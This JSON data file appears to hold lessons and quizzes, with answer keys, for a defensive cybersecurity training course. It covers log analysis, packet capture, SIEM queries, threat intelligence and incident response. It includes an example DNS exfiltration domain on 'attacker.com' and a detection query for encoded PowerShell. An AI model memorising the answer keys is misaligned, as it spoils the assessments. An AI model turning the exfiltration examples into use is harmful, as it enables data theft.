          "learningOutcome": "You can detect brute-force attacks in auth.log, query systemd journals with journalctl, and audit kernel syscalls using auditd."
        },
        "questions": [
          {
            "id": "q-25-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Linux Log Analysis?",
            "options": [
              "Analyze Linux logging architecture (/var/log/auth.log, syslog, wtmp, btmp)",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Analyze Linux logging architecture (/var/log/auth.log, syslog, wtmp, btmp) is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-25-1",
        "type": "exact",
        "question": "Which Linux command displays failed login attempts recorded in the /var/log/btmp binary log?",
        "visualSlots": "_ _ _ _ _",
        "acceptedAnswers": [
          "lastb"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "The letter 'b' appended to 'last'.",
        "explanation": "lastb reads /var/log/btmp to display failed authentication attempts."
      },
      {
        "id": "q-25-2",
        "type": "exact",
        "question": "Which journalctl flag is used to specify and filter events by a specific systemd service unit name?",
        "visualSlots": "- _",
        "acceptedAnswers": [
          "-u",
          "u"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Single letter flag for Unit.",
        "explanation": "journalctl -u <unit> filters log output specifically to that service."
      },
      {
        "id": "q-25-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Linux Log Analysis?",
        "options": [
          "Analyze Linux logging architecture (/var/log/auth.log, syslog, wtmp, btmp)",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Analyze Linux logging architecture (/var/log/auth.log, syslog, wtmp, btmp) is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: The /var/log Hierarchy & Authentication Triage",
        "instruction": "Execute the last command to review recent interactive user sessions.",
        "hints": [
          "The letter 'b' appended to 'last'."
        ]
      },
      {
        "title": "Task 2: Systemd Journalctl Filtering",
        "instruction": "Query the system journal for recent error-level events.",
        "hints": [
          "Single letter flag for Unit."
        ]
      },
      {
        "title": "Task 3: Linux Audit Framework (auditd) & Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-26"
  },
  {
    "id": "room-26",
    "stageId": "defensive-security",
    "stageTitle": "Defensive Security",
    "stageOrder": 3,
    "stage": 3,
    "level": 3,
    "levelTitle": "Defensive Security",
    "roomNumber": 26,
    "title": "Network Traffic Analysis",
    "description": "Master packet forensics: live packet capture with tcpdump, deep protocol inspection in Wireshark, TCP stream reassembly, and C2 beacon detection.",
    "difficulty": "Intermediate",
    "difficultyBadge": "Intermediate",
    "estimatedTime": "40 mins",
    "xpReward": 50,
    "prerequisites": "room-25",
    "whyAreYouHere": "Master packet forensics: live packet capture with tcpdump, deep protocol inspection in Wireshark, TCP stream reassembly, and C2 beacon detection.",
    "objectives": [
      "Capture raw network packets on Linux interfaces using tcpdump",
      "Analyze packet capture (PCAP) files using Wireshark filters",
      "Follow and reassemble TCP data streams to extract unencrypted payloads",
      "Detect automated Command and Control (C2) beaconing and DNS exfiltration"
    ],
    "skillsGained": [
      "tcpdump Capture",
      "Wireshark Display Filters",
      "TCP Stream Reassembly",
      "C2 Traffic Detection"
    ],
    "toolsAndCommands": [
      "tcpdump -nn -c 10",
      "tshark",
      "wireshark",
      "tshark -r file.pcap"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Raw Packet Capture with Tcpdump",
        "concept": "Network packets on the wire cannot lie. When endpoints are compromised or logs are deleted, the raw network packet capture (**PCAP**) preserves immutable truth. **tcpdump** is the premiere command-line packet analyzer for Linux:\n- Capture on specific interface: `tcpdump -i eth0`\n- Suppress DNS resolution for speed: `tcpdump -nn`\n- Capture specific port traffic: `tcpdump -nn port 80 or port 443`\n- Save packets to disk: `tcpdump -nn -w capture.pcap -i any`\n- Read saved capture file: `tcpdump -nn -r capture.pcap`\n- Filter for TCP SYN packets (detecting port scans): `tcpdump 'tcp[tcpflags] & tcp-syn != 0'`.",
        "whyItMatters": "Capturing full packet payloads during an active incident ensures you capture the exact exploit code transmitted by the adversary.",
        "examples": [
          "Capture HTTP traffic: `tcpdump -nn -i eth0 port 80 -A` (prints payload in ASCII)",
          "Filter IP: `tcpdump -nn host 192.168.1.50`"
        ],
        "commands": [
          {
            "cmd": "sudo tcpdump -nn -c 5 -i any 2>/dev/null || echo 'tcpdump verification check'",
            "desc": "Capture 5 live network packets to demonstrate packet sniffing"
          }
        ],
        "guidedExercise": "Inspect how tcpdump captures raw Ethernet frames, IP headers, and TCP sequence numbers.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-26-1",
            "type": "exact",
            "question": "Which tcpdump flag is used to save captured packets directly into a binary PCAP file on disk?",
            "visualSlots": "- _",
            "acceptedAnswers": [
              "-w",
              "w"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Single letter flag for Write.",
            "explanation": "tcpdump -w <filename> writes raw packets to a PCAP file for later analysis."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Wireshark Analysis & TCP Stream Reassembly",
        "concept": "**Wireshark** is the industry-standard graphical packet analysis tool. It parses hundreds of protocols and provides powerful **Display Filters**:\n- Filter by IP: `ip.addr == 192.168.1.100`\n- Filter by Protocol: `http`, `dns`, `smb`, `tls`\n- Filter HTTP POST requests: `http.request.method == 'POST'`\n- Filter DNS queries: `dns.qry.name contains 'google'`\n- Filter TCP SYN packets: `tcp.flags.syn == 1 && tcp.flags.ack == 0`.\n**TCP Stream Reassembly (Follow TCP Stream):** TCP packets arrive out of order in small segments. Wireshark tracks sequence and acknowledgment numbers, transparently reassembling the entire bidirectional conversation into a clean plaintext conversation window.",
        "whyItMatters": "Following a TCP stream reveals unencrypted HTTP form submissions, telnet passwords, and reverse shell commands in human-readable text.",
        "examples": [
          "Follow TCP Stream: Reconstructs raw reverse shell session: attacker types `whoami`, server returns `root`",
          "Export HTTP Objects: Carves uploaded malware files directly out of packet streams"
        ],
        "commands": [
          {
            "cmd": "echo 'Wireshark Display Filter: http.response.code == 200'",
            "desc": "Reference Wireshark syntax"
          }
        ],
        "guidedExercise": "Practice constructing display filters for web and DNS protocols.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-26-2",
            "type": "multiple-choice",
            "question": "Which Wireshark feature reconstructs fragmented, out-of-order TCP packets into a clean, human-readable bidirectional conversation transcript?",
            "options": [
              "Packet Colorization",
              "Follow TCP Stream",
              "Promiscuous Mode Toggle",
              "Checksum Offloading"
            ],
            "correctIndex": 1,
            "hint": "Follow the TCP...",
            "explanation": "Follow TCP Stream reassembles TCP sequence data to display the full conversation transcript between client and server."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Detecting C2 Beaconing & DNS Exfiltration Review",
        "concept": "Adversary traffic exhibits distinctive network signatures:\n- **C2 Beaconing:** Regular periodic HTTPS POST/GET connections occurring at exact or jittered intervals (detectable via delta-time clustering in Wireshark)\n- **DNS Exfiltration / Tunneling:** Abnormally long subdomain query strings (e.g. `aW52b2ljZS5wZGY=.attacker.com`), excessive TXT record queries, and high Shannon entropy in domain names.",
        "whyItMatters": "Monitoring DNS query lengths and entropy flags data exfiltration tunneling over port 53.",
        "examples": [
          "DNS Tunneling: Using iodine or dnscat2 to exfiltrate files across port 53"
        ],
        "commands": [
          {
            "cmd": "echo 'Network Traffic Analysis Mastered'",
            "desc": "Complete Network Analysis Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "tcpdump CLI packet capture (-nn, -w, -r), Wireshark display filters (ip.addr, http, dns), TCP stream reassembly, and C2/DNS tunneling detection.",
          "technicalTakeaways": "tcpdump captures raw wire packets; Wireshark display filters isolate protocols. Following TCP streams exposes full conversation payloads.",
          "commandsCovered": [
            "tcpdump",
            "tshark",
            "wireshark"
          ],
          "commonMistakes": "Confusing capture filters (BPF syntax used at capture time) with Wireshark display filters used after capture.",
          "learningOutcome": "You can capture live network packets with tcpdump, filter traffic in Wireshark, reassemble TCP streams, and spot DNS tunneling."
        },
        "questions": [
          {
            "id": "q-26-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Network Traffic Analysis?",
            "options": [
              "Capture raw network packets on Linux interfaces using tcpdump",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Capture raw network packets on Linux interfaces using tcpdump is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-26-1",
        "type": "exact",
        "question": "Which tcpdump flag is used to save captured packets directly into a binary PCAP file on disk?",
        "visualSlots": "- _",
        "acceptedAnswers": [
          "-w",
          "w"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Single letter flag for Write.",
        "explanation": "tcpdump -w <filename> writes raw packets to a PCAP file for later analysis."
      },
      {
        "id": "q-26-2",
        "type": "multiple-choice",
        "question": "Which Wireshark feature reconstructs fragmented, out-of-order TCP packets into a clean, human-readable bidirectional conversation transcript?",
        "options": [
          "Packet Colorization",
          "Follow TCP Stream",
          "Promiscuous Mode Toggle",
          "Checksum Offloading"
        ],
        "correctIndex": 1,
        "hint": "Follow the TCP...",
        "explanation": "Follow TCP Stream reassembles TCP sequence data to display the full conversation transcript between client and server."
      },
      {
        "id": "q-26-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Network Traffic Analysis?",
        "options": [
          "Capture raw network packets on Linux interfaces using tcpdump",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Capture raw network packets on Linux interfaces using tcpdump is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Raw Packet Capture with Tcpdump",
        "instruction": "Inspect how tcpdump captures raw Ethernet frames, IP headers, and TCP sequence numbers.",
        "hints": [
          "Single letter flag for Write."
        ]
      },
      {
        "title": "Task 2: Wireshark Analysis & TCP Stream Reassembly",
        "instruction": "Practice constructing display filters for web and DNS protocols.",
        "hints": [
          "Follow the TCP..."
        ]
      },
      {
        "title": "Task 3: Detecting C2 Beaconing & DNS Exfiltration Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-27"
  },
  {
    "id": "room-27",
    "stageId": "defensive-security",
    "stageTitle": "Defensive Security",
    "stageOrder": 3,
    "stage": 3,
    "level": 3,
    "levelTitle": "Defensive Security",
    "roomNumber": 27,
    "title": "SIEM Fundamentals",
    "description": "Explore enterprise Security Information and Event Management (SIEM): data ingestion pipelines, index parsing, SPL/KQL correlation queries, and alert tuning.",
    "difficulty": "Intermediate",
    "difficultyBadge": "Intermediate",
    "estimatedTime": "40 mins",
    "xpReward": 50,
    "prerequisites": "room-26",
    "whyAreYouHere": "Explore enterprise Security Information and Event Management (SIEM): data ingestion pipelines, index parsing, SPL/KQL correlation queries, and alert tuning.",
    "objectives": [
      "Explain the core architecture of a modern SIEM platform",
      "Differentiate data ingestion, parsing/normalization, and indexing",
      "Write detection queries in Splunk Processing Language (SPL) and Kusto Query Language (KQL)",
      "Tune correlation rules to eliminate false positives while preserving detection fidelity"
    ],
    "skillsGained": [
      "SIEM Architecture",
      "SPL / KQL Querying",
      "Correlation Rule Engineering",
      "Alert Tuning"
    ],
    "toolsAndCommands": [
      "grep",
      "awk",
      "curl",
      "python3"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: SIEM Architecture & Data Pipelines",
        "concept": "A **Security Information and Event Management (SIEM)** platform acts as the central brain of an enterprise Security Operations Center. It ingests gigabytes of heterogeneous log streams from firewalls, servers, cloud APIs, endpoints (Sysmon), and identity providers (Okta/Active Directory). The SIEM pipeline operates in four stages:\n1. **Ingestion (Forwarders):** Agents (Splunk Universal Forwarder, Elastic Beats, Logstash) ship encrypted log data from endpoints to the SIEM\n2. **Parsing & Normalization:** Translates raw unstructured log strings into standardized schemas (e.g. Splunk CIM, Elastic Common Schema / ECS) so that 'src_ip', 'SourceIp', and 'c-ip' map to a single field: `source_ip`\n3. **Indexing:** Compresses and indexes parsed data into high-speed search databases\n4. **Analytics & Correlation:** Evaluates scheduled search queries across millions of events to trigger security alerts.",
        "whyItMatters": "Schema normalization allows an analyst to search `source_ip=192.168.1.50` across firewalls, web servers, and VPNs in a single query.",
        "examples": [
          "Raw Log: `Nov 18 10:00:00 fw1 DROP src=10.0.0.5 dst=10.0.0.10 proto=TCP`",
          "Normalized: `action=blocked, src_ip=10.0.0.5, dest_ip=10.0.0.10, transport=tcp`"
        ],
        "commands": [
          {
            "cmd": "echo 'SIEM Pipeline: Ingestion -> Parsing -> Indexing -> Correlation'",
            "desc": "Reference SIEM architecture"
          }
        ],
        "guidedExercise": "Trace how unstructured text logs transform into structured, searchable database fields.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-27-1",
            "type": "exact",
            "question": "What stage in the SIEM pipeline translates heterogeneous log formats into a standardized, unified schema (such as ECS or CIM)?",
            "visualSlots": "_ _ _ _ _ _ _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "normalization",
              "parsing",
              "data normalization"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Making all log fields normal and standardized.",
            "explanation": "Normalization maps disparate vendor log fields into a single unified schema."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Querying SIEMs: Splunk SPL & KQL",
        "concept": "Security analysts interact with SIEMs through specialized query languages:\n- **Splunk Processing Language (SPL):** Uses pipes to chain operations:\n  - Search failed logins: `index=security sourcetype=WinEventLog:Security EventCode=4625`\n  - Calculate statistics: `| stats count by Account_Name, Source_Network_Address | sort -count`\n  - Search web errors: `index=web status>=400 | timechart span=1h count by status`\n- **Kusto Query Language (KQL - Microsoft Sentinel / Azure):**\n  - `SecurityEvent | where EventID == 4625 | summarize count() by Account, IpAddress | order by count_ desc`.",
        "whyItMatters": "Mastering aggregation commands like `stats count` or `summarize` lets you identify brute-force spikes in seconds.",
        "examples": [
          "SPL: `index=firewall action=blocked | top limit=5 src_ip`",
          "KQL: `DeviceProcessEvents | where FileName =~ 'powershell.exe' and ProcessCommandLine contains '-enc'`"
        ],
        "commands": [
          {
            "cmd": "echo 'index=security EventCode=4625 | stats count by TargetUserName'",
            "desc": "Reference Splunk SPL query"
          }
        ],
        "guidedExercise": "Analyze how search queries aggregate and correlate millions of events.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-27-2",
            "type": "multiple-choice",
            "question": "Which Splunk SPL command is used to calculate summary aggregations (such as counting events grouped by user or IP address)?",
            "options": [
              "| eval",
              "| stats",
              "| transaction",
              "| lookup"
            ],
            "correctIndex": 1,
            "hint": "Calculates statistical metrics.",
            "explanation": "| stats calculates summary statistics across events, such as count, avg, sum, or dc (distinct count)."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Correlation Rules & False Positive Tuning Review",
        "concept": "A **Correlation Rule** evaluates multiple criteria across time windows:\n`Alert if EventCode=4625 (Failed Login) > 10 from same IP within 5 minutes AND followed by EventCode=4624 (Success) within 2 minutes` (Detects successful password brute-forcing).\nTuning rules is crucial: if an automated backup service triggers a 'Mass File Modification' alert every Sunday at 2 AM, the analyst creates an **allowlist exception** for the backup service account.",
        "whyItMatters": "Well-tuned correlation rules produce high-fidelity alerts that represent true security threats.",
        "examples": [
          "Rule Tuning: Add `NOT User='svc_backup'` to prevent false positive alarms"
        ],
        "commands": [
          {
            "cmd": "echo 'SIEM Fundamentals Mastered'",
            "desc": "Complete SIEM Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "SIEM architecture (Ingest, Parse/Normalize, Index, Correlate), Splunk SPL and KQL querying, and correlation rule tuning.",
          "technicalTakeaways": "Normalization unifies field names across vendors. Correlation rules identify complex multi-event attack patterns across time windows.",
          "commandsCovered": [
            "Splunk SPL",
            "KQL"
          ],
          "commonMistakes": "Writing correlation rules with overly broad conditions that flood the SOC with unmanageable false positives.",
          "learningOutcome": "You can explain SIEM architecture, write basic SPL/KQL threat queries, and engineer correlation rules."
        },
        "questions": [
          {
            "id": "q-27-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in SIEM Fundamentals?",
            "options": [
              "Explain the core architecture of a modern SIEM platform",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Explain the core architecture of a modern SIEM platform is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-27-1",
        "type": "exact",
        "question": "What stage in the SIEM pipeline translates heterogeneous log formats into a standardized, unified schema (such as ECS or CIM)?",
        "visualSlots": "_ _ _ _ _ _ _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "normalization",
          "parsing",
          "data normalization"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Making all log fields normal and standardized.",
        "explanation": "Normalization maps disparate vendor log fields into a single unified schema."
      },
      {
        "id": "q-27-2",
        "type": "multiple-choice",
        "question": "Which Splunk SPL command is used to calculate summary aggregations (such as counting events grouped by user or IP address)?",
        "options": [
          "| eval",
          "| stats",
          "| transaction",
          "| lookup"
        ],
        "correctIndex": 1,
        "hint": "Calculates statistical metrics.",
        "explanation": "| stats calculates summary statistics across events, such as count, avg, sum, or dc (distinct count)."
      },
      {
        "id": "q-27-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in SIEM Fundamentals?",
        "options": [
          "Explain the core architecture of a modern SIEM platform",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Explain the core architecture of a modern SIEM platform is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: SIEM Architecture & Data Pipelines",
        "instruction": "Trace how unstructured text logs transform into structured, searchable database fields.",
        "hints": [
          "Making all log fields normal and standardized."
        ]
      },
      {
        "title": "Task 2: Querying SIEMs: Splunk SPL & KQL",
        "instruction": "Analyze how search queries aggregate and correlate millions of events.",
        "hints": [
          "Calculates statistical metrics."
        ]
      },
      {
        "title": "Task 3: Correlation Rules & False Positive Tuning Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-28"
  },
  {
    "id": "room-28",
    "stageId": "defensive-security",
    "stageTitle": "Defensive Security",
    "stageOrder": 3,
    "stage": 3,
    "level": 3,
    "levelTitle": "Defensive Security",
    "roomNumber": 28,
    "title": "Threat Intelligence",
    "description": "Master cyber threat intelligence (CTI): Strategic, Tactical, and Operational CTI, the Pyramid of Pain, STIX/TAXII standards, and OSINT threat feeds.",
    "difficulty": "Intermediate",
    "difficultyBadge": "Intermediate",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-27",
    "whyAreYouHere": "Master cyber threat intelligence (CTI): Strategic, Tactical, and Operational CTI, the Pyramid of Pain, STIX/TAXII standards, and OSINT threat feeds.",
    "objectives": [
      "Differentiate Strategic, Tactical, and Operational Cyber Threat Intelligence (CTI)",
      "Analyze David Bianco's Pyramid of Pain and indicator durability",
      "Understand STIX (Structured Threat Information eXpression) and TAXII sharing",
      "Integrate open-source threat intelligence (OSINT) feeds into defensive tooling"
    ],
    "skillsGained": [
      "Threat Intel Tiers",
      "Pyramid of Pain",
      "STIX / TAXII",
      "Threat Feeds & MISP"
    ],
    "toolsAndCommands": [
      "whois",
      "curl -s",
      "jq",
      "dig +short TXT"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: The Three Tiers of Cyber Threat Intelligence (CTI)",
        "concept": "**Cyber Threat Intelligence (CTI)** is evidence-based knowledge about adversaries, their motivations, capabilities, and indicators. CTI is structured into three distinct tiers:\n1. **Strategic CTI (Executive):** High-level trends, adversary motivations, and geopolitical cyber risks for CISOs and board members (e.g. 'Ransomware attacks targeting healthcare increased 40% in Q3')\n2. **Operational CTI (Architects & Leads):** Details regarding adversary Tactics, Techniques, and Procedures (TTPs), threat actor campaigns, and specific attack tools (e.g. 'APT29 is leveraging unquoted service paths in solar software')\n3. **Tactical CTI (SOC Analysts):** Technical Indicators of Compromise (IoCs) consumed by firewalls, EDRs, and SIEMs (e.g. IP addresses, malicious domain names, SHA-256 file hashes).",
        "whyItMatters": "Strategic CTI guides security budgets; Tactical CTI powers firewall blocking rules.",
        "examples": [
          "Strategic: Board report on financial fraud risks",
          "Operational: Threat report describing Lazarus Group TTPs",
          "Tactical: Block list of 500 malicious C2 IP addresses"
        ],
        "commands": [
          {
            "cmd": "curl -s https://cyber.gc.ca 2>/dev/null || echo 'Checked public CTI portal'",
            "desc": "Explore public CTI advisory sources"
          }
        ],
        "guidedExercise": "Categorize threat reports into Strategic, Operational, and Tactical intelligence.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-28-1",
            "type": "multiple-choice",
            "question": "Which tier of Cyber Threat Intelligence focuses on immediate technical Indicators of Compromise (such as malicious IP addresses and file hashes) consumed by automated detection tools?",
            "options": [
              "Strategic CTI",
              "Tactical CTI",
              "Geopolitical CTI",
              "Executive CTI"
            ],
            "correctIndex": 1,
            "hint": "Tactical feeds feed firewalls and SIEMs.",
            "explanation": "Tactical CTI focuses on technical indicators of compromise (IoCs) like IPs, hashes, and domains."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: David Bianco's Pyramid of Pain",
        "concept": "The **Pyramid of Pain** illustrates how difficult it is for an adversary to change their attack methods when defenders detect and deny them at each layer:\n- **Hash Values (Trivial):** Easy for attackers to bypass. Modifying a single benign comment or byte alters the SHA-256 hash completely\n- **IP Addresses (Easy):** Attackers switch proxy nodes or cloud IPs in seconds\n- **Domain Names (Simple):** Attackers register new disposable domains using Domain Generation Algorithms (DGA)\n- **Network & Host Artifacts (Annoying):** Modifying user-agent strings, registry keys, or file paths requires code changes\n- **Tools (Challenging):** If defenders detect the underlying exploit tool (e.g. Mimikatz, Cobalt Strike), the attacker must find or write a new tool\n- **Tactics, Techniques & Procedures / TTPs (Tough!):** Modifying how the adversary behaves (e.g. pivoting via pass-the-hash or Kerberoasting) forces the attacker to retrain and reinvent their operational tradecraft.",
        "whyItMatters": "Targeting adversary TTPs at the apex of the pyramid inflicts maximum pain and completely halts campaigns.",
        "examples": [
          "Base of Pyramid: Blocking an IP address (adversary spends $2 for a new VPS)",
          "Apex of Pyramid: Detecting Pass-the-Hash behavior (adversary must discover an entirely new lateral movement technique)"
        ],
        "commands": [
          {
            "cmd": "echo 'Pyramid of Pain: Hashes -> IPs -> Domains -> Artifacts -> Tools -> TTPs'",
            "desc": "Reference Pyramid of Pain layers"
          }
        ],
        "guidedExercise": "Evaluate why detecting adversary TTPs provides far more durable protection than blocking ephemeral IP addresses.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-28-2",
            "type": "exact",
            "question": "At the apex of the Pyramid of Pain, what does the acronym TTP stand for?",
            "visualSlots": "_ _ _ _ _ _ _ ,   _ _ _ _ _ _ _ _ _ _   &   _ _ _ _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "Tactics, Techniques and Procedures",
              "Tactics Techniques and Procedures",
              "Tactics Techniques Procedures"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Tactics, Techniques and...",
            "explanation": "TTPs (Tactics, Techniques, and Procedures) represent how an adversary operates."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Threat Sharing Standards (STIX/TAXII) & Review",
        "concept": "Organizations share threat intelligence machine-to-machine using standardized open formats:\n- **STIX (Structured Threat Information eXpression):** JSON-based structured language describing threat actors, attack patterns, observables, and indicator relationships\n- **TAXII (Trusted Automated eXchange of Intelligence Information):** An application-layer HTTPS protocol for exchanging STIX data over automated feeds.",
        "whyItMatters": "Platforms like MISP (Malware Information Sharing Platform) allow global defenders to share threat data collaboratively.",
        "examples": [
          "STIX 2.1: JSON object defining relationship: `indicator--xyz -> indicates -> attack-pattern--abc`"
        ],
        "commands": [
          {
            "cmd": "echo 'Threat Intelligence Mastered'",
            "desc": "Complete Threat Intel Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "CTI tiers (Strategic, Operational, Tactical), David Bianco's Pyramid of Pain (Hashes to TTPs), and STIX/TAXII sharing standards.",
          "technicalTakeaways": "Hashes and IPs are trivial for attackers to change; detecting TTPs at the apex of the Pyramid of Pain forces attackers to retrain.",
          "commandsCovered": [
            "whois",
            "dig",
            "curl"
          ],
          "commonMistakes": "Relying strictly on static hash blocklists while ignoring behavioral TTP detection.",
          "learningOutcome": "You can categorize threat intelligence, prioritize defenses based on the Pyramid of Pain, and explain STIX/TAXII protocols."
        },
        "questions": [
          {
            "id": "q-28-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Threat Intelligence?",
            "options": [
              "Differentiate Strategic, Tactical, and Operational Cyber Threat Intelligence (CTI)",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Differentiate Strategic, Tactical, and Operational Cyber Threat Intelligence (CTI) is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-28-1",
        "type": "multiple-choice",
        "question": "Which tier of Cyber Threat Intelligence focuses on immediate technical Indicators of Compromise (such as malicious IP addresses and file hashes) consumed by automated detection tools?",
        "options": [
          "Strategic CTI",
          "Tactical CTI",
          "Geopolitical CTI",
          "Executive CTI"
        ],
        "correctIndex": 1,
        "hint": "Tactical feeds feed firewalls and SIEMs.",
        "explanation": "Tactical CTI focuses on technical indicators of compromise (IoCs) like IPs, hashes, and domains."
      },
      {
        "id": "q-28-2",
        "type": "exact",
        "question": "At the apex of the Pyramid of Pain, what does the acronym TTP stand for?",
        "visualSlots": "_ _ _ _ _ _ _ ,   _ _ _ _ _ _ _ _ _ _   &   _ _ _ _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "Tactics, Techniques and Procedures",
          "Tactics Techniques and Procedures",
          "Tactics Techniques Procedures"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Tactics, Techniques and...",
        "explanation": "TTPs (Tactics, Techniques, and Procedures) represent how an adversary operates."
      },
      {
        "id": "q-28-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Threat Intelligence?",
        "options": [
          "Differentiate Strategic, Tactical, and Operational Cyber Threat Intelligence (CTI)",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Differentiate Strategic, Tactical, and Operational Cyber Threat Intelligence (CTI) is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: The Three Tiers of Cyber Threat Intelligence (CTI)",
        "instruction": "Categorize threat reports into Strategic, Operational, and Tactical intelligence.",
        "hints": [
          "Tactical feeds feed firewalls and SIEMs."
        ]
      },
      {
        "title": "Task 2: David Bianco's Pyramid of Pain",
        "instruction": "Evaluate why detecting adversary TTPs provides far more durable protection than blocking ephemeral IP addresses.",
        "hints": [
          "Tactics, Techniques and..."
        ]
      },
      {
        "title": "Task 3: Threat Sharing Standards (STIX/TAXII) & Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-29"
  },
  {
    "id": "room-29",
    "stageId": "defensive-security",
    "stageTitle": "Defensive Security",
    "stageOrder": 3,
    "stage": 3,
    "level": 3,
    "levelTitle": "Defensive Security",
    "roomNumber": 29,
    "title": "Incident Detection and Response",
    "description": "Execute live incident response playbooks: host network isolation, credential revocation, artifact collection, and remediation validation.",
    "difficulty": "Intermediate",
    "difficultyBadge": "Intermediate",
    "estimatedTime": "40 mins",
    "xpReward": 50,
    "prerequisites": "room-28",
    "whyAreYouHere": "Execute live incident response playbooks: host network isolation, credential revocation, artifact collection, and remediation validation.",
    "objectives": [
      "Execute standardized incident response playbooks for ransomware and credential theft",
      "Isolate compromised endpoints without destroying volatile memory",
      "Preserve live memory and system artifacts for forensic analysis",
      "Verify eradication and validate business recovery"
    ],
    "skillsGained": [
      "Playbook Execution",
      "Endpoint Isolation",
      "Volatile Memory Triage",
      "Eradication Verification"
    ],
